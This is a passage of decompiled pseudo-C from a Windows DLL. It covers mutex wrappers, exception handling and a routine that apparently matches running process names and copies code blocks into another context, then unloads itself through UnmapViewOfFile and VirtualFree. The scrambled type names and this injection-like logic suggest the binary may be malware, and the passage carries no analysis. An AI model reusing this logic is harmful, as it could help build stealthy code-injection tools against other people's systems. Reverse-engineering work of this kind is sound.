  return sub_10012B30(this[1]);
}
// 10073918: using guessed type int (__thiscall *off_10073918[2])(void *Block, char);

//----- (10012CF1) --------------------------------------------------------
int __stdcall sub_10012CF1(int a1)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  v3 = 0;
  *(_DWORD *)a1 = &off_10073948;
  sub_10009D2C(v2, &word_1008F52C);
  LOBYTE(v3) = 1;
  sub_1000EF5A(v2, (_BYTE *)(a1 + 12), 0, 0);
  LOBYTE(v3) = 3;
  sub_10009F65(v2);
  *(_DWORD *)(a1 + 28) = -1;
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  return a1;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10073948: using guessed type int (__thiscall *off_10073948)(void *Block, char);

//----- (10012D5E) --------------------------------------------------------
int *__thiscall sub_10012D5E(int *Block, char a2)
{
  sub_10012D7D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012D7D) --------------------------------------------------------
void __thiscall sub_10012D7D(int *this)
{
  *this = (int)&off_10073948;
  sub_1000F027(this + 3);
  *this = (int)&off_10073904;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10073948: using guessed type int (__thiscall *off_10073948)(void *Block, char);

//----- (10012DB0) --------------------------------------------------------
_DWORD *__stdcall sub_10012DB0(int a1)
{
  _DWORD *result; // eax

  result = sub_1002A534();
  if ( result )
    return (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(result[12] + 8))(result + 12, &a1);
  return result;
}

//----- (10012DD2) --------------------------------------------------------
_DWORD *__thiscall sub_10012DD2(int this)
{
  DWORD CurrentThreadId; // edi
  _DWORD *result; // eax

  CurrentThreadId = GetCurrentThreadId();
  result = (_DWORD *)InterlockedIncrement((volatile LONG *)(this + 28));
  if ( result )
  {
    if ( *(_DWORD *)(this + 24) == CurrentThreadId )
    {
      ++*(_DWORD *)(this + 32);
    }
    else
    {
      sub_10014CC5(this + 12, -1, 0);
      *(_DWORD *)(this + 24) = CurrentThreadId;
      *(_DWORD *)(this + 32) = 1;
      return sub_10012DB0(this);
    }
  }
  else
  {
    *(_DWORD *)(this + 24) = CurrentThreadId;
    *(_DWORD *)(this + 32) = 1;
    return sub_10012DB0(this);
  }
  return result;
}

//----- (10012E7B) --------------------------------------------------------
_DWORD *__thiscall sub_10012E7B(int this)
{
  int *v2; // edi
  _DWORD *result; // eax
  int v5[6]; // [esp+10h] [ebp-18h] BYREF

  v5[1] = this;
  v5[5] = 0;
  v2 = (int *)(this + 28);
  result = (_DWORD *)InterlockedDecrement((volatile LONG *)(this + 28));
  if ( (*(_DWORD *)(this + 32))-- == 1 )
  {
    *(_DWORD *)(this + 24) = 0;
    result = sub_1002A534();
    if ( result )
    {
      v5[0] = this;
      result = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(result[12] + 12))(result + 12, v5);
    }
    if ( *v2 >= 0 )
      return (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)(this + 12) + 16))(this + 12);
  }
  return result;
}

//----- (10012EE3) --------------------------------------------------------
int __usercall sub_10012EE3@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // ebx
  bool v3; // zf

  result = *(_DWORD *)(a1 + 28) - *(_DWORD *)(a1 + 32);
  v2 = 0;
  v3 = *(_DWORD *)(a1 + 28) == *(_DWORD *)(a1 + 32);
  *(_BYTE *)(a1 + 9) = 1;
  if ( result >= 0 && !v3 )
  {
    do
    {
      (*(void (__thiscall **)(int))(*(_DWORD *)(a1 + 12) + 16))(a1 + 12);
      result = *(_DWORD *)(a1 + 28) - *(_DWORD *)(a1 + 32);
      ++v2;
    }
    while ( v2 < result );
  }
  return result;
}

//----- (10012F0D) --------------------------------------------------------
int __stdcall sub_10012F0D(int a1)
{
  HANDLE MutexA; // eax
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  pExceptionObject[5] = 0;
  *(_DWORD *)a1 = &off_1007392C;
  MutexA = CreateMutexA(0, 0, 0);
  *(_DWORD *)(a1 + 12) = MutexA;
  if ( !MutexA )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 1007392C: using guessed type int (__thiscall *off_1007392C)(void *Block, char);

//----- (10012F6C) --------------------------------------------------------
HANDLE *__thiscall sub_10012F6C(HANDLE *Block, char a2)
{
  sub_100130B8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012F8B) --------------------------------------------------------
int __stdcall sub_10012F8B(int a1, int a2, _DWORD *a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes)
{
  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_1007392C;
  sub_10012FD3(a1, a3, a2, a4, lpMutexAttributes);
  return a1;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 1007392C: using guessed type int (__thiscall *off_1007392C)(void *Block, char);

//----- (10012FD3) --------------------------------------------------------
void __userpurge sub_10012FD3(int a1@<esi>, _DWORD *a2, int a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes)
{
  _DWORD *v5; // eax
  HANDLE v6; // eax
  HANDLE MutexW; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-30h] BYREF
  int v9[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v10; // [esp+24h] [ebp-1Ch] BYREF
  int v11; // [esp+28h] [ebp-18h]
  int v12; // [esp+2Ch] [ebp-14h]
  int v13; // [esp+3Ch] [ebp-4h]

  v5 = a2;
  v12 = 0;
  if ( a4 )
  {
    v5 = sub_1000F0FB(v9, (int)a2);
    v13 = 0;
    v12 = 1;
  }
  sub_10009F32(&v10, (int)v5);
  v13 = 2;
  if ( (v12 & 1) != 0 )
  {
    v12 &= ~1u;
    sub_10009F65(v9);
  }
  if ( a3 == 1 || a3 == 17 )
  {
    MutexW = CreateMutexW(lpMutexAttributes, 0, *(LPCWSTR *)(v11 + 12));
    *(_DWORD *)(a1 + 12) = MutexW;
    if ( MutexW )
      goto LABEL_15;
    if ( a3 != 17 || GetLastError() != 5 )
    {
LABEL_9:
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  else if ( a3 != 16 )
  {
    sub_1000DEEF(&a4);
    _CxxThrowException(&a4, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = OpenMutexW(0x100001u, 0, *(LPCWSTR *)(v11 + 12));
  *(_DWORD *)(a1 + 12) = v6;
  if ( !v6 )
    goto LABEL_9;
LABEL_15:
  v13 = -1;
  sub_10009F65(&v10);
}
// 10012FD3: using guessed type _DWORD pExceptionObject[3];

//----- (100130B8) --------------------------------------------------------
BOOL __thiscall sub_100130B8(HANDLE *this)
{
  BOOL result; // eax

  *this = &off_1007392C;
  result = CloseHandle(this[3]);
  *this = &off_10073904;
  return result;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 1007392C: using guessed type int (__thiscall *off_1007392C)(void *Block, char);

//----- (10013103) --------------------------------------------------------
char __cdecl sub_10013103(int a1)
{
  const WCHAR *v1; // ebx
  HANDLE v2; // eax
  DWORD v4; // [esp-8h] [ebp-44h]
  DWORD CurrentProcessId; // [esp-4h] [ebp-40h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2Ch] BYREF
  int v7[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v8[5]; // [esp+24h] [ebp-18h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v8[2] = 0;
  sub_10009F32(v7, a1);
  v9 = 2;
  v1 = *(const WCHAR **)(v7[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  v2 = OpenMutexW(0x100000u, 0, v1);
  sub_10025D50((int)v8, v2, 0, 0, v4, CurrentProcessId);
  LOBYTE(v9) = 3;
  if ( v8[1] )
  {
    LOBYTE(v9) = 2;
    sub_1000F1E1(v8);
    v9 = -1;
    sub_10009F65(v7);
    return 1;
  }
  else
  {
    if ( GetLastError() != 2 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    LOBYTE(v9) = 2;
    sub_1000F1E1(v8);
    v9 = -1;
    sub_10009F65(v7);
    return 0;
  }
}
// 10013103: using guessed type _DWORD pExceptionObject[3];

//----- (100131B7) --------------------------------------------------------
DWORD __thiscall sub_100131B7(int this)
{
  int *p_pExceptionObject; // eax
  DWORD result; // eax
  _ThrowInfo *v4; // [esp-4h] [ebp-18h]
  _DWORD v5[3]; // [esp+4h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+10h] [ebp-4h] BYREF

  if ( *(_BYTE *)(this + 9) )
    goto LABEL_2;
  result = sub_1002C705(*(HANDLE *)(this + 12), -1);
  if ( result == 128 )
  {
    *(_BYTE *)(this + 9) = 1;
LABEL_2:
    sub_1002C535(&pExceptionObject);
    v4 = (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  if ( result )
  {
    sub_1000E2E3(v5, 1);
    p_pExceptionObject = v5;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v4);
  }
  return result;
}
// 100131D8: variable 'v4' is possibly undefined
// 100131B7: using guessed type _DWORD var_10[3];

//----- (10013211) --------------------------------------------------------
char __thiscall sub_10013211(void *this, int pExceptionObject)
{
  char result; // al

  result = sub_1001328F((int)this, pExceptionObject);
  if ( !result )
  {
    sub_1002C587(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__);
  }
  return result;
}

//----- (1001328F) --------------------------------------------------------
char __userpurge sub_1001328F@<al>(int a1@<esi>, int pExceptionObject)
{
  DWORD v2; // eax
  _DWORD v4[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( *(_BYTE *)(a1 + 9) )
  {
LABEL_2:
    sub_1002C535(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  v2 = sub_1002C705(*(HANDLE *)(a1 + 12), pExceptionObject);
  if ( v2 == 258 )
    return 0;
  if ( v2 == 128 )
  {
    *(_BYTE *)(a1 + 9) = 1;
    goto LABEL_2;
  }
  if ( v2 )
  {
    sub_1000E2E3(v4, 1);
    _CxxThrowException(v4, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  ++*(_DWORD *)(a1 + 4);
  return 1;
}
// 1001328F: using guessed type _DWORD var_C[3];

//----- (100132F8) --------------------------------------------------------
bool __thiscall sub_100132F8(_BYTE *this)
{
  _BYTE *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[9] )
  {
    sub_1002C535(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  return sub_1001328F((int)this, 0) != 0;
}

//----- (1001332B) --------------------------------------------------------
BOOL __thiscall sub_1001332B(HANDLE *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = ReleaseMutex(this[3]);
  if ( !result )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1001332B: using guessed type _DWORD pExceptionObject[3];

//----- (10013358) --------------------------------------------------------
int __thiscall sub_10013358(_DWORD *this)
{
  return this[3];
}

//----- (1001335C) --------------------------------------------------------
char __thiscall sub_1001335C(_BYTE *this)
{
  if ( this[9] )
    return 1;
  if ( (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)this + 20))(this) )
    sub_10012B30((int)this);
  return 0;
}

//----- (100133A7) --------------------------------------------------------
int __stdcall sub_100133A7(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10073904;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_10073958;
  return result;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10073958: using guessed type int (__thiscall *off_10073958)(void *Block, char);

//----- (100133DC) --------------------------------------------------------
_DWORD *__thiscall sub_100133DC(_DWORD *Block, char a2)
{
  sub_100133FB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100133FB) --------------------------------------------------------
void __thiscall sub_100133FB(_DWORD *this)
{
  *this = &off_10073958;
  *this = &off_10073904;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);
// 10073958: using guessed type int (__thiscall *off_10073958)(void *Block, char);

//----- (10013422) --------------------------------------------------------
int __usercall sub_10013422@<eax>(_DWORD *a1@<esi>)
{
  if ( a1[2] == -1 )
    a1[2] = (*(int (__thiscall **)(_DWORD *))(*a1 + 24))(a1);
  return a1[2];
}

//----- (10013436) --------------------------------------------------------
void __cdecl sub_10013436(DWORD dwExitCode)
{
  int v1; // edi
  _DWORD *v2; // eax
  int v3; // eax
  bool v4; // bl
  char *v5; // eax
  char *v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10[3]; // [esp+10h] [ebp-4B4h] BYREF
  char *v11; // [esp+1Ch] [ebp-4A8h]
  int pExceptionObject; // [esp+20h] [ebp-4A4h] BYREF
  char *v13; // [esp+24h] [ebp-4A0h]
  _DWORD v14[3]; // [esp+28h] [ebp-49Ch] BYREF
  char v15[1164]; // [esp+34h] [ebp-490h] BYREF
  int v16; // [esp+4C0h] [ebp-4h]

  v1 = dword_1008FBB4;
  v14[2] = dword_1008FBB4;
  v16 = 0;
  v2 = sub_1001EB76(v10);
  LOBYTE(v16) = 1;
  v3 = sub_10013422(v2);
  v4 = sub_10014349(v1, (int)v15, v3) == 0;
  LOBYTE(v16) = 0;
  sub_10009696(v10);
  if ( v4 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = (char *)sub_10026534(aKernel32Dll_1);
  v6 = v5;
  if ( !v5 )
  {
    sub_1000DEEF(v14);
    _CxxThrowException(v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v14[1] = sub_100266E9(v5, sz);
  v11 = sub_100266E9(v6, aUnmapviewoffil);
  v13 = sub_100266E9(v6, aVirtualfree);
  v15[1140] = 0;
  v7 = sub_1005BD6F(v1, (int)v15);
  if ( v7 )
  {
    v8 = v7 - 1;
    if ( v8 )
    {
      v9 = v8 - 1;
      if ( !v9 )
        __asm { retn }
      if ( v9 == 1 )
        __asm { retn }
    }
  }
  ExitThread(dwExitCode);
}
// 1008FBB4: using guessed type int dword_1008FBB4;
// 10013436: using guessed type int var_4B4[3];

//----- (1001357D) --------------------------------------------------------
int __userpurge sub_1001357D@<eax>(_DWORD *a1@<ebx>, int a2@<edi>, int a3)
{
  *(_DWORD *)a3 = off_10073968;
  sub_100114E7(a2, (_DWORD *)(a3 + 4));
  sub_1000C3F3(a1, a3 + 16);
  *(_DWORD *)(a3 + 36) = 0;
  *(_BYTE *)(a3 + 40) = 0;
  *(_BYTE *)(a3 + 41) = 0;
  return a3;
}
// 10073968: using guessed type int (__thiscall *off_10073968[2])(void *Block, char);

//----- (100135C5) --------------------------------------------------------
void *__thiscall sub_100135C5(void *Block, char a2)
{
  sub_100136B9((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100135E4) --------------------------------------------------------
int __thiscall sub_100135E4(void *this, int a2, int a3)
{
  volatile LONG *v3; // ecx
  void *v4; // eax
  volatile LONG *v6; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-64h]
  int v8[10]; // [esp+10h] [ebp-50h] BYREF
  DWORD NumberOfBytesRead[6]; // [esp+38h] [ebp-28h] BYREF
  int v10; // [esp+50h] [ebp-10h]
  int v11; // [esp+5Ch] [ebp-4h]

  v7 = (volatile LONG *)(a2 + 4);
  *(_DWORD *)a2 = off_10073968;
  sub_100114E7((int)this, v7);
  v11 = 1;
  v10 = a2 + 16;
  sub_1000C28D(0, a2 + 16, 0);
  v7 = v3;
  v6 = v3;
  *(_DWORD *)(a2 + 36) = 0;
  *(_BYTE *)(a2 + 40) = 0;
  *(_BYTE *)(a2 + 41) = 0;
  NumberOfBytesRead[5] = (DWORD)&v6;
  sub_10018B3B(&v6);
  LOBYTE(v11) = 1;
  sub_10017C15(-1, 0x80000000, v8, a3, 128, -1, (int)v6, v7);
  LOBYTE(v11) = 3;
  sub_10017DBD(v8);
  v7 = 0;
  v4 = (void *)sub_100183BB((HANDLE *)v8);
  sub_1000C28D(v4, (int)NumberOfBytesRead, (void *)v7);
  LOBYTE(v11) = 4;
  sub_1001863B((HANDLE *)v8, NumberOfBytesRead);
  sub_1000C439((int *)NumberOfBytesRead, v10);
  LOBYTE(v11) = 3;
  sub_1000C45D((int *)NumberOfBytesRead);
  LOBYTE(v11) = 1;
  sub_10017D5E((int)v8);
  return a2;
}
// 1001361E: variable 'v3' is possibly undefined
// 10073968: using guessed type int (__thiscall *off_10073968[2])(void *Block, char);

//----- (100136B9) --------------------------------------------------------
void __thiscall sub_100136B9(int this)
{
  *(_DWORD *)this = off_10073968;
  if ( *(_BYTE *)(this + 41) && *(_BYTE *)(this + 40) )
    sub_10013D41(this);
  sub_1000C45D((int *)(this + 16));
  sub_10009696((int *)(this + 4));
}
// 10073968: using guessed type int (__thiscall *off_10073968[2])(void *Block, char);

//----- (1001371F) --------------------------------------------------------
void __fastcall sub_1001371F(int a1, int a2, int a3)
{
  int v3; // edi
  bool v4; // zf
  void **p_pExceptionObject; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // eax
  int v13; // eax
  _DWORD *v14; // eax
  _ThrowInfo *v15; // ecx
  unsigned int v16; // esi
  const wchar_t *v17; // edi
  int v18; // eax
  size_t v19; // ecx
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  DWORD v23; // eax
  int v24; // esi
  char *v25; // eax
  int v26; // ecx
  int v27; // eax
  _ThrowInfo *v28; // [esp-8h] [ebp-BFCh] BYREF
  _ThrowInfo *v29; // [esp-4h] [ebp-BF8h]
  char v30; // [esp+13h] [ebp-BE1h]
  int v31; // [esp+14h] [ebp-BE0h]
  void *pExceptionObject; // [esp+18h] [ebp-BDCh] BYREF
  int v33[2]; // [esp+1Ch] [ebp-BD8h] BYREF
  int v34; // [esp+24h] [ebp-BD0h]
  void *Block[3]; // [esp+28h] [ebp-BCCh] BYREF
  int *v36[2]; // [esp+34h] [ebp-BC0h] BYREF
  int v37[4]; // [esp+3Ch] [ebp-BB8h] BYREF
  const wchar_t *v38; // [esp+4Ch] [ebp-BA8h]
  _DWORD v39[2]; // [esp+50h] [ebp-BA4h] BYREF
  HANDLE v40[5]; // [esp+58h] [ebp-B9Ch] BYREF
  _DWORD v41[10]; // [esp+6Ch] [ebp-B88h] BYREF
  char v42; // [esp+94h] [ebp-B60h]
  int v43[5]; // [esp+98h] [ebp-B5Ch] BYREF
  int v44[717]; // [esp+ACh] [ebp-B48h] BYREF
  int v45; // [esp+BF0h] [ebp-4h]

  v31 = 0;
  v3 = a1;
  v4 = *(_BYTE *)(a1 + 40) == 0;
  v34 = a1;
  if ( !v4 )
  {
    sub_1002CC7B(&pExceptionObject);
    v29 = (_ThrowInfo *)&_TI2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  sub_100149AD(v36);
  v45 = 0;
  sub_10014A59(v39);
  LOBYTE(v45) = 1;
  if ( *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28) )
  {
    v7 = sub_10009D2C(v33, &word_1008F1D8);
    LOBYTE(v45) = 2;
    sub_1002CEA0((__int32)v7, (int)Block);
    v8 = (_DWORD *)sub_1000C312(a2, (int)v37);
    LOBYTE(v45) = 3;
    sub_1002CEBB(v8, (int)Block);
    LOBYTE(v45) = 2;
    sub_1000C45D(v37);
    sub_10013422((_DWORD *)(v3 + 4));
    sub_1000A28F((int)v33, aUpdtSyncMtxTme, (int)Block[2]);
    pExceptionObject = operator new(0x10u);
    LOBYTE(v45) = 4;
    if ( pExceptionObject )
    {
      v9 = sub_10018A88(Block);
      LOBYTE(v45) = 5;
      v29 = *(_ThrowInfo **)(*v9 + 4);
      v31 = 1;
      v10 = sub_10012F8B((int)pExceptionObject, 17, v33, 1, (LPSECURITY_ATTRIBUTES)v29);
    }
    else
    {
      v10 = 0;
    }
    v45 = 6;
    sub_10014A13(v36, v10);
    v45 = 2;
    if ( (v31 & 1) != 0 )
    {
      v31 &= ~1u;
      sub_10003D24(Block);
    }
    v11 = operator new(8u);
    Block[0] = v11;
    LOBYTE(v45) = 7;
    if ( v11 )
      v12 = sub_10012C8B(v36[0], v11);
    else
      v12 = 0;
    LOBYTE(v45) = 2;
    sub_10014ABF(v39, (int)v12);
    LOBYTE(v45) = 1;
    sub_10009F65(v33);
    v3 = v34;
  }
  memset(v44, 0, 2860);
  pExceptionObject = (void *)(v3 + 4);
  v13 = sub_10013422((_DWORD *)(v3 + 4));
  if ( !sub_1001475D(a3, (int)v44, v13) )
  {
    sub_1000DEEF(&pExceptionObject);
    v29 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  if ( !*(_DWORD *)(*(_DWORD *)(a2 + 4) + 28)
    || (sub_10009D2C(v33, (wchar_t *)&v44[154] + 1), LOBYTE(v45) = 8, v31 |= 2u, v30 = 1, !sub_10013103((int)v33)) )
  {
    v30 = 0;
  }
  v45 = 1;
  if ( (v31 & 2) != 0 )
  {
    v31 &= ~2u;
    sub_10009F65(v33);
  }
  if ( v30 )
  {
    sub_10009D2C(v33, (wchar_t *)&v44[154] + 1);
    LOBYTE(v45) = 9;
    v14 = sub_10018A88(Block);
    LOBYTE(v45) = 10;
    sub_10012F8B((int)v40, 16, v33, 0, *(LPSECURITY_ATTRIBUTES *)(*v14 + 4));
    LOBYTE(v45) = 12;
    sub_10003D24(Block);
    LOBYTE(v45) = 13;
    sub_10009F65(v33);
    sub_10012C8B((int *)v40, v33);
    LOBYTE(v45) = 14;
    v29 = v15;
    v28 = v15;
    Block[0] = &v28;
    sub_10009D2C(&v28, (wchar_t *)&v44[24]);
    LOBYTE(v45) = 14;
    sub_1002D15F((int)v37, 0x5508u, (LPSECURITY_ATTRIBUTES)1, (int)v28, (int)v29);
    LOBYTE(v45) = 16;
    Block[0] = (void *)v38;
    v16 = 0;
    v17 = v38 + 13;
    while ( _wcsicmp(v17, *(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12)) )
    {
      ++v16;
      v17 += 272;
      if ( v16 >= 0x28 )
      {
        LOBYTE(v45) = 14;
        sub_1002D2C1(v37);
        LOBYTE(v45) = 13;
        sub_10012CBF(v33);
        LOBYTE(v45) = 1;
        sub_100130B8(v40);
        goto LABEL_26;
      }
    }
    v25 = (char *)Block[0] + 544 * v16;
    ++*((_DWORD *)v25 + 4);
    v26 = *((_DWORD *)v25 + 2);
    v27 = v34;
    *(_DWORD *)(v34 + 36) = v26;
    *(_BYTE *)(v27 + 40) = 1;
    LOBYTE(v45) = 14;
    sub_1002D2C1(v37);
    LOBYTE(v45) = 13;
    sub_10012CBF(v33);
    LOBYTE(v45) = 1;
    sub_100130B8(v40);
  }
  else
  {
LABEL_26:
    (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)pExceptionObject + 44))(
      pExceptionObject,
      v41,
      &byte_1005B76A - (char *)sub_1005B6E8,
      4,
      4096);
    LOBYTE(v45) = 17;
    v18 = *(_DWORD *)(a2 + 4);
    v19 = 522;
    if ( (unsigned int)(2 * *(_DWORD *)(v18 + 28)) <= 0x20A )
      v19 = 2 * *(_DWORD *)(v18 + 28);
    memcpy(&v44[449], *(const void **)(v18 + 12), v19);
    v20 = (_DWORD *)sub_1000C28D((void *)(&byte_1005B76A - (char *)sub_1005B6E8), (int)v37, sub_1005B6E8);
    LOBYTE(v45) = 18;
    sub_1002A148(v41, v20);
    LOBYTE(v45) = 17;
    sub_1000C45D(v37);
    v44[581] = v41[8];
    v44[582] = &byte_1005B76A - (char *)sub_1005B6E8;
    v21 = (_DWORD *)sub_1000C28D((void *)0xB2C, (int)v43, v44);
    LOBYTE(v45) = 19;
    Block[0] = (void *)sub_1000C6CE(v21, (int)v40, (_DWORD *)(v34 + 16));
    LOBYTE(v45) = 20;
    v22 = (_DWORD *)sub_1000C28D((void *)(&byte_1005BD6E - (char *)sub_1005B76B), (int)v37, sub_1005B76B);
    LOBYTE(v45) = 21;
    v23 = sub_1002CD14((int)pExceptionObject, v22, (_DWORD *)Block[0]);
    v24 = v34;
    *(_DWORD *)(v34 + 36) = v23;
    LOBYTE(v45) = 20;
    sub_1000C45D(v37);
    LOBYTE(v45) = 19;
    sub_1000C45D((int *)v40);
    LOBYTE(v45) = 17;
    sub_1000C45D(v43);
    v4 = *(_DWORD *)(v24 + 36) == 0;
    v42 = 1;
    if ( v4 )
    {
      sub_1000DEEF(Block);
      v29 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
      p_pExceptionObject = Block;
LABEL_3:
      _CxxThrowException(p_pExceptionObject, v29);
    }
    *(_BYTE *)(v24 + 40) = 1;
    LOBYTE(v45) = 1;
    sub_10029DE8((int)v41);
  }
  LOBYTE(v45) = 0;
  sub_10014A94(v39);
  v45 = -1;
  sub_100149E8(v36);
}
// 10013A30: variable 'v15' is possibly undefined
// 1005B76A: using guessed type char byte_1005B76A;
// 1005BD6E: using guessed type char byte_1005BD6E;
// 1001371F: using guessed type _DWORD var_BA4[2];
// 1001371F: using guessed type HANDLE var_B9C[5];
// 1001371F: using guessed type int var_B5C[5];

//----- (10013D41) --------------------------------------------------------
void __thiscall sub_10013D41(int this)
{
  char v2; // al
  int v3; // eax
  _DWORD *v4; // eax
  DWORD v5; // esi
  int v6; // eax
  _ThrowInfo *v7; // [esp-4h] [ebp-4D4h]
  int v8[5]; // [esp+10h] [ebp-4C0h] BYREF
  int v9[5]; // [esp+24h] [ebp-4ACh] BYREF
  int v10; // [esp+38h] [ebp-498h]
  int v11; // [esp+3Ch] [ebp-494h] BYREF
  _DWORD *pExceptionObject; // [esp+40h] [ebp-490h] BYREF
  char v13[1160]; // [esp+44h] [ebp-48Ch] BYREF
  int v14; // [esp+4CCh] [ebp-4h]

  v2 = *(_BYTE *)(this + 40);
  v10 = this;
  if ( !v2 )
  {
    sub_1002CC29(&pExceptionObject);
    v7 = (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__;
    goto LABEL_3;
  }
  v11 = this + 4;
  v3 = sub_10013422((_DWORD *)(this + 4));
  if ( !sub_10014349(*(_DWORD *)(this + 36), (int)v13, v3) )
  {
    sub_1000DEEF(&pExceptionObject);
    v7 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
LABEL_3:
    _CxxThrowException(&pExceptionObject, v7);
  }
  v13[1140] = 1;
  pExceptionObject = (_DWORD *)sub_1000C28D((void *)0x47C, (int)v9, v13);
  v14 = 0;
  v4 = (_DWORD *)sub_1000C28D((void *)(&byte_1005BEA1 - (char *)sub_1005BD6F), (int)v8, sub_1005BD6F);
  LOBYTE(v14) = 1;
  v5 = sub_1002CD14(v11, v4, pExceptionObject);
  LOBYTE(v14) = 0;
  sub_1000C45D(v8);
  v14 = -1;
  sub_1000C45D(v9);
  if ( v5 != 1 )
  {
    sub_1000DEEF(&v11);
    _CxxThrowException(&v11, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = v10;
  *(_BYTE *)(v10 + 40) = 0;
  *(_DWORD *)(v6 + 36) = 0;
  sub_10056753();
}
// 1005BEA1: using guessed type char byte_1005BEA1;
// 10013D41: using guessed type int var_4AC[5];
// 10013D41: using guessed type int var_4C0[5];

//----- (10013EAC) --------------------------------------------------------
int __userpurge sub_10013EAC@<eax>(
        int a1@<esi>,
        int a2,
        int pExceptionObject,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14)
{
  int v14; // eax
  _DWORD v16[7]; // [esp+10h] [ebp-1Ch] BYREF

  v16[3] = 0;
